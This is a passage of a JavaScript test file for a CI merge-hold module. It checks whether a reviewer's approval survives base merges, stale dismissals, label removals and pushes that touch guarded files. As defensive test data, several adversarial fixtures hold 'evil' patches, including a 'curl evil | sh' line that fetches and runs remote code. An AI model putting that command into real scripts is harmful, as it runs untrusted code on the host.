    const compare = new RegExp(`^/repos/owner/repo/compare/${TIP}\\.\\.\\.([0-9a-f]{40})$`).exec(path);
    if (compare && compare[1] in compares) return compares[compare[1]];
    const range = /^\/repos\/owner\/repo\/compare\/([0-9a-f]{40}\.\.\.[0-9a-f]{40})$/.exec(path);
    if (range && range[1] in across) return across[range[1]];
    throw new Error(`unexpected read ${path}`);
  };
  return { github, reads };
};
// main over `files` with liftWorld's reads; `reviews` also go in the
// discussion file, as ci-status writes it.
async function lifting(world, { files = [HELD], reviews = [], queue = false } = {}) {
  const dir = tempDir("merge-holds-lift-");
  writeFileSync(join(dir, "body"), "Closes #40");
  writeFileSync(join(dir, "discussion"), reviews.map((row) => JSON.stringify(row)).join("\n"));
  writeFileSync(join(dir, "actors"), JSON.stringify({ actors: [{ kind: "human", login: "owner-person", id: 5 }] }));
  writeFileSync(join(dir, "files"), files.map((path) => JSON.stringify([path])).join("\n"));
  writeFileSync(join(dir, "denied"), "[]");
  const argv = ["99", ...["body", "discussion", "files", "denied", "actors"].map((name) => join(dir, name)), HEAD];
  if (queue) {
    writeFileSync(join(dir, "verdicts"), "");
    writeFileSync(join(dir, "link"), "null");
    argv.push(join(dir, "verdicts"), join(dir, "link"));
  }
  const lines = [];
  const log = console.log;
  console.log = (line) => lines.push(line);
  try {
    const code = await main(argv, { env: { GITHUB_REPOSITORY: REPO, BASE_SHA: BASE }, github: world.github });
    return { code, out: lines.join("\n") };
  } finally {
    console.log = log;
  }
}
const HOLD_REASON = /it changes \.github\/actions\/resolve-config\/live-config\.test\.mjs, a hold path; an approving review of this head by a person on the trusted-actor list lifts it/;

test("an approval of an earlier head lifts a hold path over a later base merge, read against the base's tip commit", async () => {
  for (const [name, compares] of Object.entries({
    "a base merge": { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH]) },
    "a base merge with a non-hold file in the net change": { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELPER, HELD_PATCH]) },
  })) {
    const world = liftWorld({ compares });
    const run = await lifting(world);
    assert.equal(run.code, 0, `${name}: ${run.out}`);
    assert.match(run.out, /owner-person approved an earlier head whose every change since is a base merge, which lifts its hold path/, name);
    // The base is resolved once by its full ref; no compare names the branch.
    assert.equal(world.reads.filter((path) => path.includes("/git/ref/")).length, 1, name);
    assert.ok(world.reads.includes(`/repos/owner/repo/compare/${TIP}...${OLD}`) && world.reads.includes(`/repos/owner/repo/compare/${MAIN}...${TIP}`), world.reads.join(" "));
    assert.ok(!world.reads.some((path) => /\/compare\/(main\.\.\.|.*\.\.\.main$)/.test(path)), world.reads.join(" "));
  }
});

// The owner's decision on #10596: a trusted person's label removal lifts no
// hold path, at the head or before a base merge, and a dismissed approval
// never counts, even one GitHub dismissed as stale on a push. The lanes App
// put the label on at 23:05; the person removed it at 23:26:14.
const LABEL = (event, at, id, login, app = null) => ({ event, label: { name: "needs-human" }, actor: { id, login }, performed_via_github_app: app, created_at: at });
const REMOVAL = [LABEL("labeled", "2026-10-27T23:05:00Z", 2, "lanes[bot]", { slug: "lanes" }), LABEL("unlabeled", APPROVED_AT, 5, "owner-person")];
// GitHub's own stale-review dismissal on the base merge's push, as #10224's
// timeline shows it: the pushing App as actor, no message, the pushed commit.
const STALE = {
  event: "review_dismissed",
  actor: { id: 2, login: "lanes[bot]", type: "Bot" },
  created_at: "2026-10-27T23:32:35Z",
  dismissed_review: { review_id: 41, state: "approved", dismissal_message: null, dismissal_commit_id: HEAD },
};
const stale = (change = {}, actor = {}) => ({ ...STALE, actor: { ...STALE.actor, ...actor }, dismissed_review: { ...STALE.dismissed_review, ...change } });
const DISMISSED_OLD = review("DISMISSED", OLD, "2026-10-27T23:31:57Z");
test("a label removal lifts no hold path", async () => {
  for (const [name, options] of Object.entries({
    "a removal before a base merge": { reviews: [], events: REMOVAL },
    "a removal while this is the head": { reviews: [], events: REMOVAL, activity: [push(HEAD, "2026-10-27T23:00:00Z")] },
    "a removal beside an approval dismissed by a person": { reviews: [DISMISSED_OLD], events: REMOVAL, timeline: [stale({ dismissal_message: "stale" }, { type: "User" })] },
  })) {
    const world = liftWorld(options);
    const run = await lifting(world);
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
    assert.ok(!world.reads.some((path) => /\/(events|activity)\?/.test(path) || path.includes("/contents/.work-item")), `${name}: ${world.reads.join(" ")}`);
  }
});

// The owner's decision of 2026-10-28 (part a): an approval GitHub dismissed
// as stale on the push of a base merge still counts, bound to its own commit,
// and lifts the head only through the carry.
test("an approval GitHub dismissed as stale on a base merge's push carries", async () => {
  for (const [name, options] of Object.entries({
    "the same net change": { reviews: [DISMISSED_OLD], timeline: [STALE] },
    "beside a label removal": { reviews: [DISMISSED_OLD], timeline: [STALE], events: REMOVAL },
    "a timeline review id read as a string": { reviews: [DISMISSED_OLD], timeline: [stale({ review_id: "41" })] },
  })) {
    const world = liftWorld(options);
    const run = await lifting(world);
    assert.equal(run.code, 0, `${name}: ${run.out}`);
    assert.match(run.out, /owner-person approved an earlier head whose every change since is a base merge, which lifts its hold path/, name);
    assert.ok(world.reads.some((path) => path.startsWith("/repos/owner/repo/issues/99/timeline?")), name);
  }
});

test("a dismissal with a message, by a person, or not by the push the carry checks revokes the approval", async () => {
  for (const [name, options] of Object.entries({
    "a dismissal with a message": { timeline: [stale({ dismissal_message: "stale" })] },
    "an empty message": { timeline: [stale({ dismissal_message: "" })] },
    "no message field": { timeline: [{ ...STALE, dismissed_review: { review_id: 41, state: "approved", dismissal_commit_id: HEAD } }] },
    "a dismissal by a person": { timeline: [stale({}, { type: "User" })] },
    "a dismissal with no actor": { timeline: [{ ...STALE, actor: null }] },
    "a dismissed request for changes": { timeline: [stale({ state: "changes_requested" })] },
    "a dismissal of another review": { timeline: [stale({ review_id: 42 })] },
    "a second dismissal event with a message": { timeline: [STALE, stale({ dismissal_message: "no" }, { type: "User" })] },
    "a dismissal commit the merges did not push": { timeline: [stale({ dismissal_commit_id: OTHER })] },
    "the approved head as the dismissal commit": { timeline: [stale({ dismissal_commit_id: OLD })] },
    "a dismissal commit that is no sha": { timeline: [stale({ dismissal_commit_id: null })] },
    "no dismissal event": { timeline: [] },
    "an unreadable timeline": { timeline: [STALE], fail: "/timeline?" },
    // Approve the head, push X, force-push the head back: no range, no lift.
    "a dismissed approval of the head itself": { reviews: [review("DISMISSED", HEAD, "2026-10-27T23:31:57Z")], timeline: [stale()] },
    "a request for changes after the dismissed approval": { reviews: [DISMISSED_OLD, { ...review("CHANGES_REQUESTED", HEAD, "2026-10-27T23:40:00Z"), id: 43 }], timeline: [STALE] },
    "a dismissed approval by a person off the trusted-actor list": { reviews: [review("DISMISSED", OLD, APPROVED_AT, 77)], timeline: [STALE] },
    "a merge that also edits a file": { timeline: [STALE], compares: { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELD_PATCH, { ...HELPER, patch: "+evil" }]) }, across: ranges(brought([BASE_DOC, { ...HELPER, patch: "+evil" }])) },
  })) {
    const run = await lifting(liftWorld({ reviews: [DISMISSED_OLD], ...options }));
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
  }
});

// The owner's decision of 2026-10-28 (part b): when the net change differs
// because the base changed a file the pull request also changes (#10224's
// shape), the approval carries only when what the merges brought into the
// approved head (OLD...HEAD) is, file for file, what the base changed between
// the two merge bases (MB_OLD...MB_HEAD): identical status and patch.
// #10224's own patches: the pull request's hunks sit lower in the shared
// file, so the base's hunk applies with the same header and context.
const SHARED_AT_OLD = { filename: ".github/actions/collect-base-activity/collect-base-activity.test.mjs", status: "modified", patch: "@@ -93,6 +93,13 @@ let root;\n context\n+mine" };
const SHARED_AT_HEAD = { ...SHARED_AT_OLD, patch: "@@ -98,6 +98,13 @@ let root;\n context\n+mine" };
const SHARED_BASE = { filename: SHARED_AT_OLD.filename, status: "modified", patch: "@@ -10,6 +10,11 @@ import\n+theirs" };
const REPLAY = { compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: merged([HELD_PATCH, SHARED_AT_HEAD]) }, across: ranges(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC])) };
test("#10224's shape carries when the merges brought exactly the base's changes", async () => {
  for (const [name, options] of Object.entries({
    "an approval standing at the earlier head": REPLAY,
    "an approval GitHub dismissed as stale": { ...REPLAY, reviews: [DISMISSED_OLD], timeline: [STALE] },
  })) {
    const world = liftWorld(options);
    const run = await lifting(world);
    assert.equal(run.code, 0, `${name}: ${run.out}`);
    assert.match(run.out, /which lifts its hold path/, name);
    assert.ok(world.reads.includes(`/repos/owner/repo/compare/${OLD}...${HEAD}`) && world.reads.includes(`/repos/owner/repo/compare/${MB_OLD}...${MB_HEAD}`), world.reads.join(" "));
  }
  // The same net change needs neither range compare.
  const world = liftWorld();
  assert.equal((await lifting(world)).code, 0);
  assert.ok(!world.reads.some((path) => path.includes(`/compare/${OLD}...`) || path.includes(`/compare/${MB_OLD}...`)), world.reads.join(" "));
});

test("a merge that adds anything beyond the base's changes, or a range not read whole, carries nothing", async () => {
  const shape = (merges, based = baseRange([BASE_DOC, SHARED_BASE]), more = {}) => ({ ...REPLAY, across: ranges(merges, based), ...more });
  const many = Array.from({ length: 300 }, (_, i) => ({ filename: `docs/${i}.md`, status: "modified", patch: "+x" }));
  for (const [name, options] of Object.entries({
    "a merge that also edits a hold path": shape(brought([BASE_DOC, SHARED_BASE, { ...HELD_PATCH, patch: "@@ -1 +1 @@\n-b\n+evil" }])),
    "a merge that also edits a non-hold file": shape(brought([BASE_DOC, SHARED_BASE, HELPER])),
    "a merge that changes the base's hunk": shape(brought([BASE_DOC, { ...SHARED_BASE, patch: "@@ -10,6 +10,11 @@ import\n+theirs\n+evil" }])),
    "a merge that renames a base file": shape(brought([{ ...BASE_DOC, status: "renamed", previous_filename: "docs/old.md" }, SHARED_BASE])),
    "a base change reverted inside the merge": shape(brought([SHARED_BASE])),
    "a base that changed a file the merges did not bring": shape(brought(), baseRange([BASE_DOC, SHARED_BASE, HELPER])),
    "a merge whose second parent the base does not hold": shape(brought([BASE_DOC, SHARED_BASE]), undefined, {
      compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: { ...merged([HELD_PATCH, SHARED_AT_HEAD]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
    }),
    "a non-merge commit beside the merge": shape(brought([BASE_DOC, SHARED_BASE]), undefined, {
      compares: { [OLD]: atOld([HELD_PATCH, SHARED_AT_OLD]), [HEAD]: { ...merged([HELD_PATCH, SHARED_AT_HEAD]), commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: OLD }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OTHER }] }], total_commits: 3 } },
    }),
    "300 files brought": shape(brought(many), baseRange(many)),
    "300 files in the base's range": shape(brought([BASE_DOC, SHARED_BASE]), baseRange(many)),
    "a brought file with no patch": shape(brought([BASE_DOC, { ...SHARED_BASE, patch: undefined }]), baseRange([BASE_DOC, { ...SHARED_BASE, patch: undefined }])),
    "a brought commit list cut short": shape(brought([BASE_DOC, SHARED_BASE], { total_commits: 251 })),
    "a base range commit list cut short": shape(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE], { total_commits: 251 })),
    "a head range that is not ahead": shape(brought([BASE_DOC, SHARED_BASE], { status: "diverged", behind_by: 1 })),
    "a base range that goes backwards": shape(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE], { status: "behind", behind_by: 1 })),
    "no merge base on the approved head's compare": { ...REPLAY, compares: { [OLD]: { ...atOld([HELD_PATCH, SHARED_AT_OLD]), merge_base_commit: null }, [HEAD]: merged([HELD_PATCH, SHARED_AT_HEAD]) } },
    "an unreadable range compare": { ...REPLAY, fail: `/compare/${OLD}...` },
    "a dismissal with a message": { ...REPLAY, reviews: [DISMISSED_OLD], timeline: [stale({ dismissal_message: "stale" })] },
  })) {
    const run = await lifting(liftWorld(options));
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
  }
});

test("no adversarial history, approval or reviewer carries a lift to the head", async () => {
  const cases = {
    // Each merge that writes a change of its own lists it in what the merges
    // brought (OLD...HEAD) too, beside the base's own change.
    "a merge that also edits a hold path (an evil merge)": {
      compares: { [OLD]: atOld(), [HEAD]: merged([{ ...HELD_PATCH, patch: "@@ -1 +1 @@\n-a\n+evil" }]) },
      across: ranges(brought([BASE_DOC, { ...HELD_PATCH, patch: "@@ -1 +1 @@\n-b\n+evil" }])),
    },
    "a merge that adds a hold path": { compares: { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH, OTHER_HELD]) }, across: ranges(brought([BASE_DOC, OTHER_HELD])) },
    // The re-review of #10596: a merge that rewrites a non-hold file the
    // approved head already changed, or adds one, writes a change of its own.
    "a merge that rewrites scripts/helper.sh, which the approved head changed": {
      compares: { [OLD]: atOld([HELD_PATCH, HELPER]), [HEAD]: merged([HELD_PATCH, { ...HELPER, patch: "@@ -1 +1 @@\n-x\n+curl evil | sh" }]) },
      across: ranges(brought([BASE_DOC, { ...HELPER, patch: "@@ -1 +1 @@\n-y\n+curl evil | sh" }])),
    },
    "a merge that adds a file the base touched, with content of its own": {
      compares: { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-base\n+evil" }]) },
      across: ranges(brought([BASE_DOC, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-base\n+evil" }]), baseRange([BASE_DOC, { filename: "scripts/lib.mjs", status: "modified", patch: "@@ -1 +1 @@\n-lib\n+base" }])),
    },
    // The base took in the same change to one of the approved head's files,
    // so the merges brought less than the base changed: it fails closed.
    "a merge after which the base holds one of the approved head's files": {
      compares: { [OLD]: atOld([HELD_PATCH, OTHER_HELD]), [HEAD]: merged([HELD_PATCH]) },
      across: ranges(brought(), baseRange([BASE_DOC, OTHER_HELD])),
    },
    "a non-merge commit after the approval": { compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }] }], total_commits: 2 } } },
    "a merge of a branch other than the base": {
      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
    },
    // A crafted merge commit (itself a merge of base commits) as the second parent.
    "a crafted merge whose second parent the base does not hold": {
      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: OTHER, parents: [{ sha: MAIN }, { sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: OTHER }] }], total_commits: 3 } },
    },
    "a merge whose parents are not commit objects": { compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [OLD, MAIN] }], total_commits: 2 } } },
    "a force push that rewrites the approved head": {
      compares: { [OLD]: atOld(), [HEAD]: { files: [HELD_PATCH], commits: [{ sha: "6".repeat(40), parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: "6".repeat(40) }, { sha: MAIN }] }], total_commits: 2 } },
      across: ranges(brought([BASE_DOC], { status: "diverged", behind_by: 1 })),
    },
    "a history longer than the compare lists": { compares: { [OLD]: atOld(), [HEAD]: { ...merged([HELD_PATCH]), total_commits: 251 } } },
    "a head in a fork": { fork: true },
    // A compare listing fewer files than the pull request changes is cut short.
    "a compare that lists fewer files than the pull request changes": { changed: 2 },
    "a base branch that does not resolve to a commit": { tip: "main" },
    "an unreadable base ref": { fail: "/git/ref/" },
    // A dismissed approval with no stale-dismissal event never counts.
    "an approval later dismissed": { reviews: [review("DISMISSED", OLD)] },
    "an approval followed by a request for changes on another head": { reviews: [review("APPROVED", OLD), review("CHANGES_REQUESTED", "8".repeat(40), "2026-10-27T23:40:00Z")] },
    "an approval by a person off the trusted-actor list": { reviews: [review("APPROVED", OLD, APPROVED_AT, 77)] },
    "an approval by a bot account": { reviews: [review("APPROVED", OLD, APPROVED_AT, 5, "Bot")] },
    "unreadable reviews": { fail: "/reviews?" },
    "an unreadable pull request": { fail: "/pulls/99" },
    "an unreadable compare": { fail: "/compare/" },
  };
  for (const [name, options] of Object.entries(cases)) {
    const run = await lifting(liftWorld(options));
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
  }
});

test("an approval carried over a base merge lifts no verifier hold, and an exact-head approval in the discussion needs no reads", async () => {
  const carried = await lifting(liftWorld(), { queue: true });
  assert.equal(carried.code, 1, carried.out);
  assert.match(carried.out, /lifts its hold path/);
  assert.match(carried.out, /pr-verify has not passed this head/);
  assert.match(carried.out, /its pr-verify FAILs could not be read/);
  const world = liftWorld();
  const exact = await lifting(world, { reviews: [review("APPROVED", HEAD)] });
  assert.equal(exact.code, 0, exact.out);
  assert.deepEqual(world.reads, []);
});

// The independent security review of #10671: the compare API reports no
// file mode, so the exact path reads the head's and its merge base's trees and
// requires each brought file's mode to be the base's; and the carry runs only
// on a base that is the repository's default branch.
test("the exact carry reads file modes from the trees, and a non-default base carries nothing", async () => {
  const flipped = FILES_AT.map(([path]) => [path, path === "docs/base.md" ? "100755" : "100644"]);
  const heldFlip = FILES_AT.map(([path]) => [path, path === SHARED_AT_OLD.filename ? "100755" : "100644"]);
  for (const [name, options] of Object.entries({
    "a merge that also flips a base file's mode": { ...REPLAY, modes: trees(treeOf(flipped)) },
    "a merge that flips the mode of a file both sides changed": { ...REPLAY, modes: trees(treeOf(heldFlip)) },
    "a brought file missing from the head's tree": { ...REPLAY, modes: trees(treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
    "a brought file missing from both trees": { ...REPLAY, modes: trees(treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md")), treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
    "a brought file missing from the base's tree": { ...REPLAY, modes: trees(undefined, treeOf(FILES_AT.filter(([path]) => path !== "docs/base.md"))) },
    "a truncated head tree": { ...REPLAY, modes: trees(treeOf(FILES_AT, { truncated: true })) },
    "a base tree with no truncated flag": { ...REPLAY, modes: trees(undefined, { tree: treeOf(FILES_AT).tree }) },
    "an unreadable tree": { ...REPLAY, fail: "/git/trees/" },
    "an exact carry into a base that is not the default branch": { ...REPLAY, base: "release" },
    "a same-net-change carry into a base that is not the default branch": { base: "release" },
    "an unreadable repository": { defaultBranch: null },
  })) {
    const run = await lifting(liftWorld(options));
    if (UNGATED_CARRIES.has(name)) {
      assert.equal(run.code, 0, `${name}: ${run.out}`);
      assert.match(run.out, /which lifts its hold path/, name);
      continue;
    }
    assert.equal(run.code, 1, `${name}: ${run.out}`);
    assert.match(run.out, HOLD_REASON, name);
  }
  // A removed base file is absent from both trees, and that carries.
  const removed = { filename: "docs/gone.md", status: "removed", patch: "@@ -1 +0,0 @@\n-x" };
  const world = liftWorld({ ...REPLAY, across: ranges(brought([BASE_DOC, SHARED_BASE, removed]), baseRange([BASE_DOC, SHARED_BASE, removed])) });
  const run = await lifting(world);
  assert.equal(run.code, 0, run.out);
  assert.ok(world.reads.includes(`/repos/owner/repo/git/trees/${HEAD}?recursive=1`) && world.reads.includes(`/repos/owner/repo/git/trees/${MB_HEAD}?recursive=1`), world.reads.join(" "));
  // An approval of the head itself needs no default-branch read.
  const exact = liftWorld({ base: "release", reviews: [review("APPROVED", HEAD)] });
  assert.equal((await lifting(exact, { reviews: [] })).code, 0);
});

test("baseMergesOnly and baseMergeCarry read their inputs strictly", () => {
  const then = { commits: [{ sha: OLD, parents: [{ sha: MAIN }] }], total_commits: 1 };
  const inBase = new Set([MAIN]);
  assert.equal(baseMergesOnly(then, merged([]), OLD, inBase), true);
  assert.equal(baseMergesOnly(then, merged([]), OLD), false);
  assert.deepEqual(mergedParents(then, merged([])), [MAIN]);
  assert.equal(baseMergesOnly(then, { commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }] }, OLD, inBase), false);
  assert.equal(baseMergesOnly(then, merged([]), "9".repeat(40), inBase), false);
  // The whole net change decides: any file the merge changes differently.
  assert.equal(baseMergeCarry(atOld([HELD_PATCH, HELPER]), merged([HELPER, HELD_PATCH]), OLD, [MAIN]), true);
  assert.equal(baseMergeCarry(atOld([HELD_PATCH, HELPER]), merged([HELD_PATCH, { ...HELPER, patch: "+z" }]), OLD, [MAIN]), false);
  assert.equal(baseMergeCarry(atOld([HELD_PATCH]), merged([HELD_PATCH, HELPER]), OLD, [MAIN]), false);
  assert.equal(baseMergeCarry(atOld([HELD_PATCH]), merged([HELD_PATCH]), OLD, []), false);
});

test("exactBaseCarry, approvalCarry and autoDismissed read their inputs strictly", () => {
  const { approvalCarry, autoDismissed, exactBaseCarry } = holdsModule;
  // Both directions: the base's files equal what the merges brought, and
  // each brought file has the base's mode in the head's tree.
  const same = [treeOf(FILES_AT), treeOf(FILES_AT)];
  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC]), same), true);
  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([SHARED_BASE, BASE_DOC])), false);
  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC, SHARED_BASE]), same), false);
  assert.equal(exactBaseCarry(brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC]), same), false);
  // A base that did not move: nothing brought, nothing changed.
  assert.equal(exactBaseCarry(brought([]), { status: "identical", behind_by: 0, files: [], commits: [], total_commits: 0 }, same), true);
  assert.equal(exactBaseCarry(brought(), null, same), false);
  assert.equal(exactBaseCarry(brought(undefined, { behind_by: undefined }), baseRange(), same), false);
  assert.equal(exactBaseCarry(brought(undefined, { commits: undefined }), baseRange(), same), false);
  // The compare API reports no file mode, so a merge that also flips a base
  // file's mode lists as the base's changes alone; the trees show it.
  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC]), [treeOf([["docs/base.md", "100755"]]), treeOf([["docs/base.md"]])]), false);
  assert.equal(exactBaseCarry(brought([BASE_DOC]), baseRange([BASE_DOC]), [treeOf([["docs/base.md"]], { truncated: true }), treeOf([["docs/base.md"]])]), false);
  // A file the base removed is in neither tree.
  const gone = { filename: "docs/gone.md", status: "removed", patch: "-x" };
  assert.equal(exactBaseCarry(brought([gone]), baseRange([gone]), same), true);
  assert.equal(exactBaseCarry(brought([gone]), baseRange([gone]), [treeOf([["docs/gone.md"]]), treeOf([])]), false);
  // A renamed file's old path is in neither tree.
  const moved = { ...BASE_DOC, status: "renamed", previous_filename: "docs/old.md" };
  assert.equal(exactBaseCarry(brought([moved]), baseRange([moved]), same), true);
  assert.equal(exactBaseCarry(brought([moved]), baseRange([moved]), [treeOf([...FILES_AT, ["docs/old.md"]]), treeOf(FILES_AT)]), false);
  const [then, now] = [atOld([HELD_PATCH, SHARED_AT_OLD]), merged([HELD_PATCH, SHARED_AT_HEAD])];
  const [merges, based] = [brought([BASE_DOC, SHARED_BASE]), baseRange([BASE_DOC, SHARED_BASE])];
  const modes = [treeOf(FILES_AT), treeOf(FILES_AT)];
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, null, modes), true);
  assert.equal(approvalCarry(then, now, OLD, [], merges, based, null, modes), false);
  assert.equal(approvalCarry(then, now, OLD, [MAIN], null, null, null, modes), false);
  // The exact path needs both trees; the same net change needs neither.
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based), false);
  assert.equal(approvalCarry(atOld(), merged([HELD_PATCH]), OLD, [MAIN], null, null), true);
  // A restored approval carries only when its dismissal commit is one the
  // merges pushed since the approved head.
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, HEAD, modes), true);
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, OLD, modes), false);
  assert.equal(approvalCarry(then, now, OLD, [MAIN], merges, based, OTHER, modes), false);
  assert.deepEqual([...autoDismissed([STALE, { event: "reviewed" }, null])], [["41", HEAD]]);
  assert.deepEqual([...autoDismissed([STALE, stale({ dismissal_message: "x" })])], []);
  assert.deepEqual([...autoDismissed("not a list")], []);
});

// The owner's decision Q10 of 2026-10-28, verbatim in #10759: "go w/
// recommendations". An approval of H0 stays valid at H1 when the diff H0...H1
// touches no hold-path file; a push that touches one needs a new approval,
// a test-only or comment-only edit included. The peer review of #10737 adds
// the files hold paths load (REVIEW_FLOOR, CARRY_REFUSES).
const H0 = "a".repeat(40);
const H1 = "b".repeat(40);
const pushed = (files, extra = {}) => ({ status: "ahead", behind_by: 0, files: files.map((filename) => ({ filename, status: "modified", patch: "+x" })), commits: [{ sha: H1 }], total_commits: 1, ...extra });
const carriesQ10 = (merges, holdPaths = [], dismissal = null) => approvalCarry(null, null, H0, [], merges, null, dismissal, null, holdPaths);

test("Q10: an approval carries over a push that touches no hold path", () => {
  assert.equal(carriesQ10(pushed(["docs/a.md", "plugins/work-items/README.md"])), true);
  assert.equal(carriesQ10(pushed(["docs/a.md"]), [], H1), true, "a stale dismissal by the push it checks");
  // No hold paths read: this path does not run, and the base-merge path alone decides.
  assert.equal(approvalCarry(null, null, H0, [], pushed(["docs/a.md"]), null, null, null), false);
});

test("Q10: a push that touches any hold path, a configured one or a file a hold path loads refuses", () => {
  for (const [name, files, holdPaths] of [
    ["a gated file", [".github/scripts/pr-merge/merge-holds.mjs"], []],
    ["a test-only edit to a gated file's directory", [".github/scripts/pr-merge/merge-holds.test.mjs"], []],
    ["a comment-only edit to a gated file", ["plugins/source-control/skills/babysit-prs/scripts/babysit_merge_policy.py"], []],
    ["a rename off a gated file", ["docs/moved.md"], []],
    ["a configured hold path", ["docs/conventions/held.md"], ["docs/conventions/**"]],
    ["a helper a gated file imports", ["plugins/source-control/skills/babysit-prs/scripts/babysit_util.py"], []],
    ["a script ci-status runs", ["scripts/check-stale-base-overlap.sh"], []],
    ["an action a hold-path workflow uses", [".github/actions/report-check-run/report-check-run.mjs"], []],
    ["a workflow", [".github/workflows/pr-review-hosted.yml"], []],
  ]) {
    const merges = pushed(files);
    if (name === "a rename off a gated file") merges.files[0].previous_filename = ".github/actions/request-lane-token/action.yml";
    assert.equal(carriesQ10(merges, holdPaths), false, name);
    assert.equal(ungatedSince(merges, holdPaths), false, name);
  }
  assert.ok(CARRY_REFUSES.includes("scripts/**"));
});

test("Q10: a compare not read whole, not ahead, or with a dismissal the push did not make refuses", () => {
  const many = Array.from({ length: 300 }, (_, i) => `docs/${i}.md`);
  for (const [name, merges, dismissal] of [
    ["an unreadable compare", null, null],
    ["300 files listed", pushed(many), null],
    ["a commit list cut short", pushed(["docs/a.md"], { total_commits: 251 }), null],
    ["a diverged head", pushed(["docs/a.md"], { status: "diverged", behind_by: 1 }), null],
    ["a file with no name", { ...pushed([]), files: [{ status: "modified" }] }, null],
    ["a stale dismissal by another commit", pushed(["docs/a.md"]), "c".repeat(40)],
  ]) {
    assert.equal(carriesQ10(merges, [], dismissal), false, name);
  }
  assert.equal(carriesQ10(pushed(["docs/a.md"]), null), false, "unread hold paths");
});

// The queue holds select-tests checks before the lanes (#10747). Expected
// reasons are ci-status's own error texts for the same holds: its hold-label
// step's three label errors, its pr-unblock step's error and its lanes App
// step's kill-switch error, which reconcile.test.mjs keys on.
const QUEUED = "fedcba9876543210fedcba9876543210fedcba98";
const queuedPull = (over = {}) => ({ number: 7, head: { sha: QUEUED }, labels: [], user: { id: 42, type: "User" }, ...over });
const ON = { appId: "99", disabled: "false", repoDisabled: "false" };

test("queueHolds: a pull request with no hold label, stop or switch passes", () => {
  assert.deepEqual(holdsModule.queueHolds({ pull: queuedPull(), statuses: [], tracker: null, lanes: ON }), []);
});

test("queueHolds: each hold label holds with ci-status's text", () => {
  for (const [label, want] of [
    ["do-not-merge", "#7 carries the 'do-not-merge' label; the merge queue removes it. Remove the label and re-queue to merge."],
    ["needs-human", "#7 carries 'needs-human'; the merge queue removes it. Removing the label approves this pull request; re-queue it to merge."],
    ["pr-verify-failed", "#7 carries 'pr-verify-failed': pr-verify failed its head, and a pass at a new commit removes the label. The merge queue removes it; re-queue it once the label is off."],
    ["human-merge-hold", "#7 carries 'human-merge-hold': a person merges it. The merge queue removes it; a person on the trusted-actor list removing the label approves it, then re-queue it to merge."],
    ["security: outside-actor", "#7 carries 'security: outside-actor': someone outside the organization wrote on it, and only a person removes the label. Re-queue it once the label is off."],
  ]) {
